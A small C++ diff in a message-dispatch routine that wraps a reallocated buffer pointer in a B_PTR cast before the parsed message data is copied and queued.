@@ -76,7 +76,7 @@ namespace Dispatcher {
             queue->msg_type  = __builtin_bswap32(S_CAST(ULONG, Parser::UnpackDword(&parser)));
 
             queue->length   = parser.Length;
-            queue->buffer   = x_realloc(queue->buffer, queue->length);
+            queue->buffer   = B_PTR(x_realloc(queue->buffer, queue->length));
 
             x_memcpy(queue->buffer, parser.buffer, queue->length);
             AddMessage(queue);
